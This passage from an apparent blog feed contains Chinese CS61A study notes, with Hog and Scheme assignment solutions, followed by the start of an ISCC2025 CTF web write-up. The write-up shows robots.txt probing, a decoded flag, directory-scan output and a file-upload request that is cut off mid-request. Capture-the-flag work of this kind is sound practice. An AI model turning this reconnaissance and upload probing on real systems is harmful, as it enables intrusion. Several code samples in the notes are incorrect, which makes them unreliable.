rate:\", average_win_rate(boar_strategy))     print(\"sus_strategy win rate:\", average_win_rate(sus_strategy))     print(\"final_strategy win rate:\", average_win_rate(final_strategy))     \"*** You may add additional experiments as you wish ***\"     def boar_strategy(score, opponent_score, threshold=11, num_rolls=6):     \"\"\"This strategy returns 0 dice if Boar Brawl gives at least THRESHOLD     points, and returns NUM_ROLLS otherwise. Ignore the Sus Fuss rule.     \"\"\"     # BEGIN PROBLEM 10     if boar_brawl(score, opponent_score) &gt;= threshold:         return 0     else:         return num_rolls       # END PROBLEM 10   def sus_strategy(score, opponent_score, threshold=11, num_rolls=6):     \"\"\"This strategy returns 0 dice when rolling 0 increases the score by at least     THRESHOLD points, and returns NUM_ROLLS otherwise. Consider both the Boar Brawl and     Suss Fuss rules.\"\"\"     # BEGIN PROBLEM 11     if sus_points(score + boar_brawl(score, opponent_score)) - score &gt;= threshold:         return 0     else:         return num_rolls     # END PROBLEM 11   def final_strategy(score, opponent_score):     \"\"\"Write a brief description of your final strategy.      *** YOUR DESCRIPTION HERE ***     \"\"\"     # BEGIN PROBLEM 12     return 6  # Remove this line once implemented.     # END PROBLEM 12   ########################## # Command Line Interface # ##########################  # NOTE: The function in this section does not need to be changed. It uses # features of Python not yet covered in the course.   @main def run(*args):     \"\"\"Read in the command-line argument and calls corresponding functions.\"\"\"     import argparse      parser = argparse.ArgumentParser(description=\"Play Hog\")     parser.add_argument(         \"--run_experiments\", \"-r\", action=\"store_true\", help=\"Runs strategy experiments\"     )      args = parser.parse_args()      if args.run_experiments:         run_experiments()   一个简单的项目实现，主要难在语言不通，题设很巧妙，需要我们用到前六节课所学的知识。  最终python3 -i hog.py有如下测试结果：  &gt;&gt;&gt; run_experiments()  Max scoring num rolls for six-sided dice: 7 always_roll(6) win rate: 0.494 catch_up win rate: 0.5125 always_roll(3) win rate: 0.34850000000000003 always_roll(8) win rate: 0.4635 boar_strategy win rate: 0.6685000000000001 sus_strategy win rate: 0.6910000000000001 final_strategy win rate: 0.511   与题设在问题10的预期“You should find that running now shows the boar_strategy win rate for close to 66-67%.”  Lecture 7 Function Abstruction  函数抽象，主要是进一步介绍高阶函数与lambda表达式。  在课程结尾还讲了Error和Traceback  Lecture 8 Function Examples  Python修饰器  在 Python 中，装饰器（Decorator）是一种强大的语法糖，允许在不修改原有函数代码的情况下，增强或修改函数的行为。它们本质上是一个可调用对象（函数、类等），接受一个函数作为输入，并返回另一个函数。  下面是一个例子：  def trace(fn):     def traced(x):         print(\"Calling\",fn,\"on argument\",x)         return fn(x)     return traced  @trace def square(x):     return x * x   其中，被trace修饰的squre可以等价于：  square = trace(square)   相当于把函数squre作为参数传入trace。     trace函数接收原始的square函数作为参数fn。   trace内部定义了traced函数并返回它，这个traced函数会替代原始的square函数。   新的square实际上是trace返回的traced函数。   所以当调用square(5)时，参数5被传递给traced函数的x参数。  用C语言实现修饰器的效果则如下：  typedef int (*Function)(int);  int square(int x){     return x * x; }  Function trace(Function func){     static int traced(int x){         printf(\"Calling %p on argument %d\\n\", (void*)func, x);         return func(x);     }     return traced; }  int main(){     //@trace     Function decorated = trace(square);     printf(\"Result: %d\\n\",decorated(5));     return 0; }   Lecture 9 Recursion  递归，比较重要的章节，主要是思路，个人认为这里以Python的Environment来解释递归不如直接上树形结构来的直观。实际上下一节课（lecture 10）就是树形递归。  在Python中实现递归会比较方便，因为python提供了灵活的函数返回值，使我们可以返回若干不同类型的值，不同于C/C++，因而在写代码的时候会更简洁一点。  Lecture 10 Tree-Recursion  本节课在最后提到了用树形递归加速斐波那契数列问题，实际上这是一个子问题分解，也可以理解为一种特殊的动态规划。  传统的斐波那契直接遵循其递推关系描述：  def fib_recursive(n):     if n &lt;= 1:         return n     return fib_recursive(n-1) + fib_recursive(n-2)   我们会发现其存在严重的重复计算问题，利用树形递归的思想，可以加速算法的实现：  def fib_iterative(n):     if n &lt;= 1:         return n          a, b = 0, 1  # 初始化F(0)和F(1)     for _ in range(2, n+1):         c = a + b      # 计算F(i) = F(i-1) + F(i-2)         a, b = b, c    # 滑动窗口更新              return b   Lecture 11 Sequences  Python数据类型：List  列表（list）是有限长度的相同类型的数据的集合，可以类比其他语言的数组，但比它们更强大。  定义一个列表：  dist = [1,2,3]   与其他语言相似地，列表的可以被索引访问，索引从0开始，因而dist[0]=1，利用相应函数可以获取列表的的长度，len(dist)的值为3。  python允许多维数组，如：  &gt;&gt;&gt; pairs = [[10, 20], [30, 40]] &gt;&gt;&gt; pairs[1] [30, 40] &gt;&gt;&gt; pairs[1][0] 30   python为使用者提供了语法糖，如：  &gt;&gt;&gt; digits = [1, 8, 2, 8] &gt;&gt;&gt; [2, 7] + digits * 2 [2, 7, 1, 8, 2, 8, 1, 8, 2, 8]   可以发现digits被复制为2份。  列表的语法糖可以快速生成符合要求的序列：  &gt;&gt;&gt; odds = [1,2,3,4,5,6,7,8,9,10] &gt;&gt;&gt; [x for x in odds if x % 2 == 0] [2,4,6,8,10]   for循环  python优化了for循环，如果需要对digits进行遍历，可以有如下操作：  for elem in digits:     print(elem)   可以认为elem为digits的元素，并随着每次循环elem自动向后改变，直到最后一个元素。  range(x,y)是一个python内置序列，可以理解为一个左闭右开区间，如：  sum = 0 for i in range(1,11):     sum += i   可以等价于 \\(i \\in [1,11) = [1,10]\\\\ sum = \\sum^{10}_{i=1}i\\) 但是要注意，in作为运算符，其表达式返回一个布尔类型的值，如1 in digist的返回值为Ture。  此外，:运算符也可作为区间，依然符合左闭右开法则，左端省略则认为从0开始，右端省略则认为到最后。如dist[1:3]表示为从元素1到元素2的子序列  Lecture 12 Containers  List相关的内联函数  使用sum(&lt;list&gt;)可以简单实现列表的加和。  如：  &gt;&gt;&gt; [2,3] + [4] [2,3,4] &gt;&gt;&gt; sum([2,3],[4]) [2,3,4]   String  exec()可接受string类型的参数并作为命令执行。  可以将String理解为特殊的列表。  字典（Dictionary）  在 Python 里，字典（dict）的功能和其他编程语言中的 Map（或者叫哈希表、关联数组）是类似的。它们都借助 键值对（key-value pairs） 来存储数据，而且键都是唯一的，如果重复赋值，后面的值会覆盖前面的值。其中键必须是可哈希（不可变）的类型，像字符串、数字、元组（元组里的元素也得是可哈希的）。Python 3.7之后字典会保持插入顺序，迭代时会按照键值对插入的顺序返回。  Lecture 13 Data Abstraction  数据抽象是一个方法论，核心是改变一个功能时不影响另一个功能。  Lecture 14 Trees  主要讲述用列表实现树这个数据结构。  def tree(root, branches=[]):     for branch in branches:         assert is_tree(branch)     return [root] + list(branches)  def root(tree):     return tree[0]  def branches(tree):     return tree[1:]  def is_tree(tree):     if type(tree) != list or len(tree) &lt; 1 :         return False     for branch in branches(tree):         if not is_tree(branch):             return False     return Ture  def is_leaf(tree):     return not branches(tree)    本节课很有用，建议重复学习。  Lecture 15 Mutability  对象（Objects)  本节课终于讲到了对象。面向对象思想深深影响了现代编程语言，个人认为用Java学习面向对象会强过任何语言，因为Java的强面向对象性可以使我们更深刻的理解其特点。  面向对象要求对象拥有属性和方法，大多数编程语言调用对象的属性与方法都会使用.；  但这里只是简单的提及，后面应该会细讲  元组（Tuples）  元组相当于一个逗号序列，但是不可变，这不同于列表。列表是可变的。  这里所说的元组不可变是指大小或者结构，即空间不变，而非值不变。  可变性  在 Python 中，参数传递的方式既不是单纯的值传递，也不是单纯的引用传递，而是采用共享传递（Call by Sharing），也被称作对象引用传递。下面详细解释：  共享传递的核心特点     变量是对象的引用：Python 里，变量存放的是对象的引用，并非对象本身。   参数传递时引用被复制：当把参数传递给函数时，实际上是将变量的引用复制给了函数参数。这就使得函数内部的参数和外部的变量指向同一个对象。   对象的可变性决定了修改行为：            对于可变对象（如列表、字典、集合），在函数内部对其进行修改，外部的原始对象也会受到影响。       对于不可变对象（如整数、字符串、元组），由于无法修改对象本身，在函数内部对参数进行重新赋值时，只是让参数指向了一个新对象，不会改变外部的原始对象。           Lecture 16 Iterators  迭代器（Iterator）  在 Python 中，迭代器（Iterator）是实现了迭代器协议的对象，它允许你逐个访问集合中的元素，而无需预先加载整个集合到内存中。这一特性使得 Python 能够高效处理大规模数据，也是 Python 中循环、生成器和许多内置函数的核心机制。  迭代器必须实现两个核心方法：     __iter__()：返回迭代器自身（self），用于在for循环等场景中获取迭代器。   __next__()：返回迭代器的下一个元素。当没有更多元素时，抛出StopIteration异常。   迭代器是一次性的，当next为None时结束迭代。  惰性计算（Lazy Evaluation）  在 Python 中，惰性计算（Lazy Evaluation） 是一种重要的编程策略，它允许程序在需要时才进行计算，而非提前计算所有结果。这一特性显著提升了内存效率和程序性能，尤其适用于处理大数据、无限序列或复杂计算。  许多Python的内置函数返回类型为迭代器：          map(func, iterable)：将函数应用到每个元素。      nums = [1, 2, 3] squares = map(lambda x: x**2, nums)  # 返回map对象（迭代器）                filter(predicate, iterable)：过滤符合条件的元素。      evens = filter(lambda x: x % 2 == 0, nums)  # 返回filter对象                zip(*iterables)：并行迭代多个序列。      names = ['Alice', 'Bob'] ages = [25, 30] zipped = zip(names, ages)  # 返回zip对象           此外， itertools模块也提供了多种惰性工具。  Lecture 17 Generators  生成器  在Python中，生成器（Generators） 是实现惰性计算的一种特殊工具，它允许你在需要时才生成数据，而非一次性计算并存储所有结果。这使得代码更高效、更节省内存，尤其适合处理大数据或无限序列。生成器是一种特殊的迭代器，它的创建方式更简洁：     生成器函数：使用yield关键字的函数。   生成器表达式：类似列表推导式，但用圆括号()。                  特性       普通函数       生成器函数                       执行方式       一次性执行完毕       可以暂停和恢复执行                 状态保存       不保存状态，每次调用重置       保存上一次暂停的状态                 返回值       return返回单个值       yield返回迭代器（生成器）                 内存占用       可能高（存储所有结果）       低（按需生成）           使用yield关键字定义，每次调用next()时恢复执行： def countdown(n):     while n &gt; 0:         yield n  # 暂停执行并返回当前值         n -= 1  # 创建生成器对象 c = countdown(3)  print(next(c))  # 3 print(next(c))  # 2 print(next(c))  # 1 print(next(c))  # StopIteration异常   执行流程：    调用生成器函数时，函数体不会立即执行，而是返回一个生成器对象。   每次调用next()时，函数恢复执行，直到遇到yield暂停。   状态（变量值）会被保存，下次调用next()时继续执行。   生成器表达式（Generator Expressions）语法类似列表推导式，但用圆括号：  # 列表推导式：立即生成列表 squares_list = [x**2 for x in range(5)]  # [0, 1, 4, 9, 16]  # 生成器表达式：返回生成器对象 squares_gen = (x**2 for x in range(5))   # 生成器对象  print(next(squares_gen))  # 0 print(next(squares_gen))  # 1   高级生成器特性 send()方法  向生成器内部发送值并恢复执行： def receiver():     while True:         item = yield  # 接收外部发送的值         print(f\"Received: {item}\")  r = receiver() next(r)  # 启动生成器，必须先调用一次 r.send(\"Hello\")  # 发送值并恢复执行 → 输出: Received: Hello r.send(\"World\")  # → 输出: Received: World   throw()和close()    throw()：向生成器抛出异常。   close()：终止生成器。     gen = (x for x in range(5)) print(next(gen))  # 0 gen.close() print(next(gen))  # StopIteration异常（生成器已关闭）           yield from（Python 3.3+） 委托子生成器： def sub_generator():     yield 1     yield 2  def main_generator():     yield from sub_generator()  # 委托子生成器  gen = main_generator() print(list(gen))  # [1, 2]   Lecture 18 Objects  面向对象编程（Object-Oriented Programming，OOP）是一种编程范式，它将数据（属性）和操作数据的方法（行为）封装在对象中，并通过类来定义对象的结构和行为。Python 是一门支持面向对象编程的语言，提供了类、继承、多态等核心特性。类是对象的蓝图，定义了对象的属性和方法。对象是类的实例，具有类定义的属性和方法。  在Python中：  class Students:     #属性     name = \"Jack\"     age = 18     #方法     def drink():         print(\"drinking!\")   在C++中：  class Students{     #属性 private:     string name;     int age;         #方法 public:     void drink(){         printf(\"drinking!\\n\");     } };   在Java中：  public class Students{     private String name;     private int age;          public void drink(){         System.out.println(\"drinking!\");     } }   Lecture 19 Attributes  当我们需要调用创建对象时：  stu = Students() #python   Students stu(); //c++   Students stu = new Students(); //Java   此后如果需要调用对象的属性，可使用.来操作即可。  构造器/构造函数  在python中，如果需要在创建对象时对对象的属性进行初始化，则需要用到内联函数__init__():  class Students:     #没有特殊的初始化属性     def __init__(self, name, age):         self.name = name         self.age = age    Tom = Student('Tom',18) print(Tom.name) #Tom   这里的self不是需要填写的形式参数，而是所有实例方法必须有的参数，指实例自己。  如果熟悉C/C++或Java的人会在这里感到迷惑，因为name和age并没有被显式地定义。事实上这在Python中是被允许的，但是在其它很多语言中是不被允许的，例如Java：  public class Students{     private String name;//显式地定义属性，相当于实例化前的self.name     private int age;          public Student(String name,int age){         this.name = name;         this.age = age;     } }  public class Main{     public static void main(String args[]){ //main函数         Students Tom = new Students(\"Tom\",18);         System.out.println(Tom.name);     } }   在Java中，初始化函数/构造函数被成为构造器，是一个不需要声明返回值的、和类名称相同的函数。this关键字类似于self，这里的this.age等于在前面声明的private int age，而age是形式参数中的age。  在C++中：  class Students{ private:     string name;     int age;  public:     Students(string _name,int _age){         name = _name;         age = _age;     }          ~Students(){         delete[] string;         delete age;     } };   初始化函数/构造函数被成为构造函数，是一个不需要声明返回值的、和类名称相同的函数，与其匹配的是析构函数，在删除对象时调用。  Lecture 20 Inheritance  继承，即子类继承父类的属性和方法，可扩展或修改父类行为。可以认为是父类的拓展。  在python中：  class Animal:     def speak(self):         return \"Generic sound\"     def drink(self):         return \"drink\"  class Cat(Animal):  # 继承自Animal     def speak(self):  # 方法重写         return \"Meow\"  cat = Cat() print(cat.speak())  # → \"Meow\" print(cat.drink())  # → \"drink\"   方法重写是指在子类中实现与父类同名的函数时，其功能会覆盖父类的功能，当你调用时，使用的是子类实现的功能。当子类没有实现时，依旧可以调用该功能，此时是父类实现的功能。  面向对象的核心奥义之一是：不要重复实现方法。这也是继承这一特性出现的原因。  Lecture 21 Representation  represent  在 Python 里，repr() 是一个内置函数，其作用是返回一个对象的字符串表示形式，并且这个字符串应当是可解析的，或者说能清晰展示对象内容。  这意味着使用repr()可以获取构造该对象的代码。  如：  import datetime  today = datetime.datetime.now()  print(str(today))   # 输出：2025-07-05 12:30:45.123456（便于用户阅读） print(repr(today))  # 输出：datetime.datetime(2025, 7, 5, 12, 30, 45, 123456)（便于开发者理解）   points = [Point(0, 0), Point(1, 1)] print(points)  # 输出：[Point(0, 0), Point(1, 1)]   在自定义类中，我们可以通过 __repr__() 方法来定义对象的 repr() 输出。按照惯例，这个方法返回的字符串格式应该是 ClassName(arg1, arg2, ...)：  class Point:     def __init__(self, x, y):         self.x = x         self.y = y          def __repr__(self):         return f'Point({self.x}, {self.y})'  p = Point(3, 4) print(repr(p))  # 输出：Point(3, 4)   格式化字符串  Python 3.6之后引入了全新的格式化字符串方法，也就是课程视频中提到的F-String。直接在大括号中输入表达式即可。  如：  name = \"David\" age = 40 print(f\"Hello, {name}! You are {age} years old.\") # 输出：Hello, David! You are 40 years old.  x = 10 y = 20 print(f\"The sum of {x} and {y} is {x + y}\") # 输出：The sum of 10 and 20 is 30  text = \"hello\" print(f\"Uppercase: {text.upper()}\") # 输出：Uppercase: HELLO  price = 9.99 print(f\"Price: ${price:.2f}\")  # 保留2位小数 # 输出：Price: $9.99  person = {\"name\": \"Eve\", \"age\": 28} print(f\"{person['name']} is {person['age']} years old\") # 输出：Eve is 28 years old   这与C语言的格式化字符串有些许不同：  char name[] = \"David\"; int age = 40; printf(\"Hello, %s! You are %d years old.\\n\",name,age);   魔术方法（Magic Methods）  在 Python 中，魔术方法（Magic Methods）也被称为特殊方法（Special Methods），是一类以双下划线 __ 开头和结尾的特殊方法。它们为类提供了丰富的内置功能，使得自定义类能够像内置类型一样进行各种操作（如加减乘除、迭代、比较等）。  初始化与销毁：    __init__(self, ...)类的构造函数，创建对象时自动调用。   __del__(self)对象被销毁时调用（垃圾回收前），常用于资源释放。   字符串表示：     __str__(self)返回用户友好的字符串表示，用于 print() 和 str()。   __repr__(self)返回开发者友好的字符串表示，用于调试和 repr()。   算术运算符：     __sub__：减法（-）   __mul__：乘法（*）   __truediv__：除法（/）   __floordiv__：整除（//）   __mod__：取模（%）   __pow__：幂运算（**）   还有很多其他的，这里不过多阐述。  Lecture 22 Composition  链表（LInked List）  链表在C语言中已经学过：  struct node{     int id;     node *next; }Node;  Node *phead = (*Node)malloc(sizeof(Node)); phead-&gt;id = -1; phead-&gt;next = NULL;  void add(){ \t... }   C++的STL（Standard TemplateLibrary，标准模版库）中已经实现好双端链表和单向链表：  #include &lt;iostream&gt; #include &lt;list&gt;  int main() {     std::list&lt;int&gt; myList;     myList.push_back(1);     // 尾部插入     myList.push_front(0);    // 头部插入          // 遍历链表     for (int num : myList) {         std::cout &lt;&lt; num &lt;&lt; \" \";     }          myList.pop_front();      // 删除头部元素     std::cout &lt;&lt; \"\\nSize: \" &lt;&lt; myList.size();  // 输出: 1     return 0; }   其中std::list为双向链表， std::forward_list为单向链表  。  Java 的标准库中提供了 java.util.LinkedList 类，它实现了双向链表的功能，并实现了 List 和 Deque 接口，如：  import java.util.LinkedList;  public class LinkedListExample {     public static void main(String[] args) {         // 创建链表         LinkedList&lt;String&gt; list = new LinkedList&lt;&gt;();                  // 添加元素         list.add(\"Apple\");         list.add(\"Banana\");         list.addFirst(\"Cherry\");                  // 遍历链表         for (String fruit : list) {             System.out.println(fruit);         }                  // 移除元素         list.removeFirst();                  // 获取链表大小         System.out.println(\"Size: \" + list.size());     } }   而Python中并没有内置的链表结构，意味着我们需要自己实现。在课程中，老师给到一个单端链表的实现：  class List:     def __init__(self,id,next = empty):         assert next is Link empty or isinstance(next, Link)         self.id = id         self.next = next        s = List(1, List(2, List(3)))   Lecture 23 Efficiency  简单介绍了时间复杂度、空间复杂度和记忆化。  如果要了解或者深入研究应当参考《数据结构与算法》这门课。  Lecture 24 Decomposition  模块化设计，现场实现了一个Restaurant例子。  Lecture 25 Data Examples  给到了迭代器、链表的例子，建议跟代码敲一遍。  Lecture 30 Calculator  异常与异常处理  异常在前文Lecture 7已有提过，主要是程序运行时产生的错误，常见的错误有：     SyntaxError：语法错误   TypeError：类型错误（如对非数字类型进行数学运算）   ValueError：值错误（如 int(\"abc\")）   IndexError：索引越界   KeyError：字典键不存在   FileNotFoundError：文件不存在   ZeroDivisionError：除零错误   在 Python 中，异常处理是一种捕获和响应程序运行时错误的机制。通过异常处理，程序可以在遇到错误时不会崩溃，而是执行特定的恢复或清理操作。 Python 异常处理的核心概念和用法有：  try-except 块  使用 try 块包裹可能出错的代码，except 块处理特定类型的异常，使用 except Exception as e 捕获所有异常，并通过变量 e 获取异常信息：  try:     result = 10 / 0  # 可能引发 ZeroDivisionError except ZeroDivisionError:     print(\"Error: 除数不能为零！\") #------------------------- try:     num = int(\"abc\")  # 可能引发 ValueError     result = 10 / num  # 可能引发 ZeroDivisionError except ValueError:     print(\"Error: 输入不是有效的整数！\") except ZeroDivisionError:     print(\"Error: 除数不能为零！\") #------------------------- try:     # 可能引发多种异常的代码     file = open(\"nonexistent.txt\", \"r\") except Exception as e:     print(f\"发生错误: {e}\")  # 输出具体错误信息   使用 traceback 模块获取异常的堆栈跟踪信息：  import traceback  try:     result = 10 / 0 except ZeroDivisionError as e:     traceback.print_exc()  # 打印完整的错误堆栈   else 块在 try 块没有引发异常时执行；而finally 块无论是否发生异常都会执行，常用于资源清理：  try:     result = 10 / 2 except ZeroDivisionError:     print(\"Error: 除数不能为零！\") else:     print(f\"结果: {result}\")  # 当没有异常时执行 finally:     print(\"over\")   使用 raise 手动触发异常：  def divide(a, b):     if b == 0:         raise ZeroDivisionError(\"除数不能为零！\")     return a / b  try:     result = divide(10, 0) except ZeroDivisionError as e:     print(e)  # 输出: 除数不能为零！   通过继承 Exception 类可以创建自定义异常：  class InvalidAgeError(Exception):     def __init__(self, message=\"年龄不能为负数！\"):         self.message = message         super().__init__(self.message)  def check_age(age):     if age &lt; 0:         raise InvalidAgeError()     print(f\"年龄有效: {age}\")  try:     check_age(-5) except InvalidAgeError as e:     print(e)  # 输出: 年龄不能为负数！   Part2 Scheme  Lecture 28 Scheme  26、27不存在，课程从28继续开始按顺序编号。  从本章开始介绍一门全新的编程语言：Scheme。Scheme是Lisp的方言，Scheme只重视括号，而不关注缩进和空格。  从本节课开始，我们需要用Python编写一个Scheme解释器，这是一项很有挑战性的工程。  Lecture 29 Scheme Lists  &lt;Scheme&gt;  Lecture 30 Calculator  &lt;Scheme&gt;  Lecture 31 Interpreter  从本节课开始，正式介绍Scheme语言及实现其解释器的各种前置知识，可以认为是《编译原理》的启蒙和初级教学，  Lecture 32 Tail Calls (Optional)  尾递归。  &lt;Scheme&gt;  Lecture 33 Programs as Data  &lt;Scheme&gt;  Lecture 34 Macros  &lt;Scheme&gt;  Porject 4 Scheme                 从节开始，进行最后一个项目的编写，可以在[Scheme       CS自学社区](http://www.learncs.site/docs/curriculum-resource/cs61a/cs61a_zh/project/scheme)查看中文版的任务。           项目中将要编辑的文件：     scheme_eval_apply.py：Scheme 表达式递归求值器   scheme_forms.py：特殊形式求值   scheme_classes.py：描述 Scheme 表达式的类   questions.scm：需要实现的 Scheme 过程   问题 1      def define(self, symbol, value):         \"\"\"Define Scheme SYMBOL to have VALUE.\"\"\"         # BEGIN PROBLEM 1         \"*** YOUR CODE HERE ***\"         self.bindings[symbol] = value         # END PROBLEM 1      def lookup(self, symbol):         \"\"\"Return the value bound to SYMBOL. Errors if SYMBOL is not found.\"\"\"         # BEGIN PROBLEM 1         \"*** YOUR CODE HERE ***\"         if symbol in self.bindings:             return self.bindings[symbol]         # END PROBLEM 1         raise SchemeError('unknown identifier: {0}'.format(symbol))   问题 2  def scheme_apply(procedure, args, env):     \"\"\"Apply Scheme PROCEDURE to argument values ARGS (a Scheme list) in     Frame ENV, the current environment.\"\"\"     validate_procedure(procedure)     if not isinstance(env, Frame):        assert False, \"Not a Frame: {}\".format(env)     if isinstance(procedure, BuiltinProcedure):         # BEGIN PROBLEM 2         \"*** YOUR CODE HERE ***\"         res = []         print(f\"args: {args}, args.first: {args.first}, args.rest: {args.rest}\")         while args is not nil:             res.append(args.first)             args = args.rest         if procedure.need_env:             res.append(env)             # END PROBLEM 2         try:             # BEGIN PROBLEM 2             \"*** YOUR CODE HERE ***\"             return procedure.py_func(*res)              # END PROBLEM 2         except TypeError as err:             raise SchemeError('incorrect number of arguments: {0}'.format(procedure))     elif isinstance(procedure, LambdaProcedure):         # BEGIN PROBLEM 9         \"*** YOUR CODE HERE ***\"         # END PROBLEM 9     elif isinstance(procedure, MuProcedure):         # BEGIN PROBLEM 11         \"*** YOUR CODE HERE ***\"         # END PROBLEM 11     else:         assert False, \"Unexpected procedure: {}\".format(procedure)   Python作为弱类型语言实在是令人抓狂，需要注意的是，args是一个Pair类型，可以在程序运行时发现，执行 print(f\"args: {args}, args.first: {args.first}, args.rest: {args.rest}\")时返回如下结果：  args: (2 2), args.first: 2, args.rest: (2)   这说明args和args.rest是相同类型，而args.first是数字类型。  问题 3  def scheme_eval(expr, env, _=None): # Optional third argument is ignored     \"\"\"Evaluate Scheme expression EXPR in Frame ENV.      &gt;&gt;&gt; expr = read_line('(+ 2 2)')     &gt;&gt;&gt; expr     Pair('+', Pair(2, Pair(2, nil)))     &gt;&gt;&gt; scheme_eval(expr, create_global_frame())     4     \"\"\"     print(f\"scheme_eval: {expr}, env: {env}\")     # Evaluate atoms     if scheme_symbolp(expr):         print(f\"  scheme_symbolp(expr), scheme_eval: {expr}, env: {env}, return value: {env.lookup(expr)}\")         return env.lookup(expr)              elif self_evaluating(expr):         print(f\"  self_evaluating(expr), scheme_eval: {expr}, return value: {expr}\")         return expr          # All non-atomic expressions are lists (combinations)     if not scheme_listp(expr):         print(f\"  not scheme_listp(expr), scheme_eval: {expr}, raise SchemeError\")         raise SchemeError('malformed list: {0}'.format(repl_str(expr)))     first, rest = expr.first, expr.rest     if scheme_symbolp(first) and first in scheme_forms.SPECIAL_FORMS:         print(f\"  scheme_symbolp(first) and first in scheme_forms.SPECIAL_FORMS, first: {first}, rest: {rest}, env: {env}, return value: {scheme_forms.SPECIAL_FORMS[first](rest, env)}\")         return scheme_forms.SPECIAL_FORMS[first](rest, env)     else:         # BEGIN PROBLEM 3         \"*** YOUR CODE HERE ***\"         print(f\"  expr: {expr}, first: {first}, rest: {rest}, env: {env}, processer: {scheme_eval(first, env)}\")         processer = scheme_eval(first, env)         args = rest.map(lambda x: scheme_eval(x, env))         return scheme_apply(processer, args, env)         # END PROBLEM 3   为了方便观察，我在代码中添加了print方便显示递归过程，有如下测试结果：  scm&gt; (+ 2 2) scheme_eval: (+ 2 2), env: &lt;Global Frame&gt; scheme_eval: +, env: &lt;Global Frame&gt;   scheme_symbolp(expr), scheme_eval: +, env: &lt;Global Frame&gt;, return value: #[+]   expr: (+ 2 2), first: +, rest: (2 2), env: &lt;Global Frame&gt;, processer: #[+] scheme_eval: +, env: &lt;Global Frame&gt;   scheme_symbolp(expr), scheme_eval: +, env: &lt;Global Frame&gt;, return value: #[+] scheme_eval: 2, env: &lt;Global Frame&gt;   self_evaluating(expr), scheme_eval: 2, return value: 2 scheme_eval: 2, env: &lt;Global Frame&gt;   self_evaluating(expr), scheme_eval: 2, return value: 2 args: (2 2), args.first: 2, args.rest: (2) 4   后记  proj写到这里暂时写不动了，不太适应这种弱类型语言，时间全都花费在找参数类型上，这违背了编程的初衷，等后期顿悟了再回来填空吧。  Part3 SQL  Lecture 35-39 SQL  SQL（Structured Query Language）是一种专门用于管理和操作关系型数据库的编程语言。  主要功能：     数据定义（DDL）：用于创建、修改和删除数据库对象，像表、视图、索引等。   数据操作（DML）：负责对数据进行插入、查询、更新和删除操作。   数据控制（DCL）：用于管理用户权限，例如授予或撤销权限。   事务控制（TCL）：对事务进行管理，包括提交或回滚事务。   基本语法规则：     不区分大小写：一般习惯将关键字大写，而表名和列名小写。   语句以分号结尾：在大多数数据库系统中，SQL 语句以分号作为结束标志。   注释：单行注释使用--，多行注释使用/* ... */。   Select语句  SELECT [expression] AS [name], ...;  -- 简单查询 SELECT * FROM students;  -- 带条件查询 SELECT name, age FROM students WHERE age &gt; 20;  -- 排序 SELECT * FROM students ORDER BY age DESC;  -- 去重 SELECT DISTINCT gender FROM students;  -- 分页 SELECT * FROM students LIMIT 10 OFFSET 20;  -- MySQL语法   还有很多SQL语句，不在这里过多展示，可以进行查询获取。"
  },
  
  {
    "title": "ISCC2025部分 wp",
    "url": "/posts/ISCC2025wp/",
    "categories": "Cyber Security",
    "tags": "ctf, web, iscc",
    "date": "2025-05-20 12:00:00 +0800",
    "content": "ISCC2025 wp  BITs2Future：lamaper，Charlie，Anyakwi  Web  战胜卞相壹  进入网页首先尝试查找可以目录，发现存在/robots.txt  112.126.73.173:49100/robots.txt User-agent: * Disallow: f10g.txt   尝试访问f10g.txt失败  进而查看网站前端，发现提示：  SGF B[ae];B[ce];B[df];B[cg];B[ag];B[ai];B[ci];B[ff];B[hf];B[jf];B[gh];B[ih];B[le];B[lg];B[li];B[ni];B[oh];B[of];B[ne]    了解到SGF是围棋棋谱格式，由于部分围棋棋盘不存在“i”列，而本提示中存在“B[ih]”，因而认为本题中所给的棋盘包含“i”列，尝试绘图：  import matplotlib.pyplot as plt  raw_pairs = [     \"ae\", \"ce\", \"df\", \"cg\", \"ag\", \"ai\",     \"ci\", \"ff\", \"hf\", \"jf\", \"gh\", \"ih\",     \"le\", \"lg\", \"li\", \"ni\", \"oh\", \"of\", \"ne\" ]  def char_to_num(c):     return ord(c.lower()) - ord('a') + 1  points = [] for pair in raw_pairs:     x = char_to_num(pair[0])       y = char_to_num(pair[1])       points.append( (x, y) )  plt.figure(figsize=(12,12)) plt.gca().invert_yaxis()  #  for x in range(1,20):     for y in range(1,20):         plt.scatter(x, y, s=10, color='gray', alpha=0.5)  for (x,y) in points:     plt.scatter(x, y, s=200, color='red', edgecolor='black')     plt.text(x+0.1, y+0.1, f'({x},{y})', fontsize=8, ha='left')  plt.xticks(range(1,20), [chr(96+i) for i in range(1,20)]) plt.yticks(range(1,20), range(1,20)) plt.title(\"围棋坐标可视化\") plt.grid(True, alpha=0.3) plt.savefig('go_board.png', dpi=300)     发现酷似 \\(2=0\\) 因而尝试访问/f12g.txt，获得flagISCC{@ll_h@ve_t2_w1n_2n_th3_ch3ssb2@rd!}  纸嫁衣6外传  对目录进行排查：  [14:28:03] 200 -   115B - /docker-compose.yml [14:28:03] 200 -   409B - /Dockerfile [14:28:06] 200 -   556B - /includes/ [14:28:06] 301 -   328B - /includes  -&gt;  http://112.126.73.173:49102/includes/ [14:28:06] 200 -   875B - /index [14:28:06] 200 -   875B - /index.php [14:28:06] 200 -   875B - /index.php/login/ [14:28:12] 403 -   282B - /server-status [14:28:12] 403 -   282B - /server-status/ [14:28:13] 403 -   282B - /src/ [14:28:13] 301 -   323B - /src  -&gt;  http://112.126.73.173:49102/src/ [14:28:15] 500 -   615B - /upload/b_user.xls [14:28:15] 500 -   615B - /upload/1.php [14:28:15] 500 -   615B - /upload/2.php [14:28:15] 500 -   615B - /upload/b_user.csv [14:28:15] 500 -   615B - /upload/upload.php [14:28:15] 500 -   615B - /upload/test.php [14:28:15] 500 -   615B - /upload/loginIxje.php [14:28:15] 301 -   327B - /uploads  -&gt;  http://112.126.73.173:49102/uploads/ [14:28:15] 403 -   282B - /uploads/ [14:28:15] 500 -   615B - /upload/test.txt [14:28:15] 200 -    2KB - /upload.php [14:28:15] 200 -    2KB - /upload [14:28:15] 200 -    2KB - /upload/   在/index.php/login/得到提示，访问/includes/flag得到提示为“get”一把锤子  于是在上传文件时尝试文件包含：  POST /upload.php HTTP/1.1 Host: 112.126.73.173:49102 Content-Length: 179 Cache-Control: max-age=0 Accept-Language: zh-CN Upgrade-Insecure-Requests: 1 Origin: http://112.126.73.173:49102 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBZA4W8JyBuKQkfZf User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 